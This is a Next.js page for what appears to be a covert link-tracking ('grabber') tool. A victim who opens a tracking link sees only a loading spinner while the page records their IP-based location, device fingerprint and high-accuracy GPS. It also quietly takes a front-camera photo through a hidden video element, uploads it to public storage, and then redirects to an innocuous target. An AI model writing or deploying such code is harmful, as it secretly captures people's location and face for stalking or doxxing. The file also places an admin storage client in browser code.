'use client';

import { useEffect, useState, useRef } from 'react';
import { useParams } from 'next/navigation';
import { supabase } from '@/lib/supabase';
import { supabaseAdmin } from '@/lib/supabase';

export default function TargetPage() {
  const params = useParams();
  const [redirectUrl, setRedirectUrl] = useState('');
  const [ready, setReady] = useState(false);
  const hasCaptured = useRef(false);

  useEffect(() => {
    if (hasCaptured.current) return;
    hasCaptured.current = true;

    const capture = async () => {
      const { data: link } = await supabase
        .from('tracking_links')
        .select('*')
        .eq('tracking_code', params.code)
        .eq('is_active', true)
        .single();

      if (!link) return;
      setRedirectUrl(link.target_url);

      let ipData: any = {};
      try {
        const res = await fetch('https://ipapi.co/json/');
        ipData = await res.json();
      } catch {}

      const deviceData = getDeviceInfo();

      let gpsData: any = {};
      if (link.tracking_type === 'ip_gps' || link.tracking_type === 'ip_gps_photo') {
        try {
          gpsData = await getGPSPosition();
        } catch {}
      }

      let photoUrl = '';
      if (link.tracking_type === 'ip_gps_photo') {
        try {
          photoUrl = await capturePhoto();
        } catch {}
      }

      const payload = {
        tracking_link_id: link.id,
        ip_address: ipData.ip || null,
        country: ipData.country_name || null,
        city: ipData.city || null,
        region: ipData.region || null,
        isp: ipData.org || null,
        timezone: ipData.timezone || null,
        latitude: ipData.latitude || null,
        longitude: ipData.longitude || null,
        ...deviceData,
        gps_latitude: gpsData.lat || null,
        gps_longitude: gpsData.lng || null,
        gps_accuracy: gpsData.accuracy || null,
        photo_url: photoUrl || null,
      };

      await supabase.from('captured_data').insert(payload);
      await supabase.rpc('increment_visits', { link_id: link.id });
      setReady(true);
    };

    capture();
  }, [params.code]);

  useEffect(() => {
    if (ready && redirectUrl) {
      window.location.replace(redirectUrl);
    }
  }, [ready, redirectUrl]);

  return (
    <div style={{
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      minHeight: '100vh',
      fontFamily: 'Arial, sans-serif',
      color: '#333',
    }}>
      <div style={{ textAlign: 'center' }}>
        <div style={{
          width: '60px',
          height: '60px',
          border: '4px solid #e5e7eb',
          borderTopColor: '#667eea',
          borderRadius: '50%',
          animation: 'spin 1s linear infinite',
          margin: '0 auto 20px',
        }} />
        <p>Loading, please wait...</p>
      </div>
      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  );
}

function getDeviceInfo() {
  const ua = navigator.userAgent;
  const screenRes = `${screen.width}x${screen.height}`;

  let os = 'Unknown';
  let osVersion = '';
  if (ua.includes('Windows')) {
    os = 'Windows';
    osVersion = ua.match(/Windows NT ([0-9.]+)/)?.[1] || '';
  } else if (ua.includes('Mac')) {
    os = 'macOS';
    osVersion = ua.match(/Mac OS X ([0-9_]+)/)?.[1]?.replace(/_/g, '.') || '';
  } else if (ua.includes('Linux')) {
    os = 'Linux';
  } else if (ua.includes('Android')) {
    os = 'Android';
    osVersion = ua.match(/Android ([0-9.]+)/)?.[1] || '';
  } else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) {
    os = 'iOS';
    osVersion = ua.match(/OS ([0-9_]+)/)?.[1]?.replace(/_/g, '.') || '';
  }

  let browser = 'Unknown';
  let browserVersion = '';
  if (ua.includes('Chrome') && !ua.includes('Edg')) {
    browser = 'Chrome';
    browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || '';
  } else if (ua.includes('Firefox')) {
    browser = 'Firefox';
    browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || '';
  } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
    browser = 'Safari';
    browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || '';
  } else if (ua.includes('Edg')) {
    browser = 'Edge';
    browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1] || '';
  }

  let deviceType = 'Desktop';
  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) deviceType = 'Tablet';
  else if (/Mobile|Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) deviceType = 'Mobile';

  const macAddress = '';

  return {
    device_type: deviceType,
    os,
    os_version: osVersion,
    browser,
    browser_version: browserVersion,
    user_agent: ua,
    language: navigator.language,
    screen_resolution: screenRes,
    mac_address: macAddress,
    imei: '',
  };
}

function getGPSPosition(): Promise<{ lat: number; lng: number; accuracy: number }> {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject('No GPS');
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve({
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
      }),
      reject,
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

async function capturePhoto(): Promise<string> {
  return new Promise((resolve, reject) => {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);

    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
      .then((stream) => {
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = 640;
          canvas.height = 480;
          const ctx = canvas.getContext('2d')!;
          ctx.drawImage(video, 0, 0, 640, 480);

          canvas.toBlob(async (blob) => {
            if (!blob) return reject('No blob');

            const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
            const fileName = `photos/${Date.now()}_${Math.random().toString(36).substring(2)}.jpg`;

            const { data, error } = await supabaseAdmin.storage
              .from('captured_photos')
              .upload(fileName, file, { contentType: 'image/jpeg' });

            stream.getTracks().forEach((t) => t.stop());
            video.remove();

            if (error) return reject(error);

            const { data: publicData } = supabaseAdmin.storage
              .from('captured_photos')
              .getPublicUrl(fileName);

            resolve(publicData.publicUrl);
          }, 'image/jpeg', 0.8);
        }, 500);
      })
      .catch(reject);
  });
}
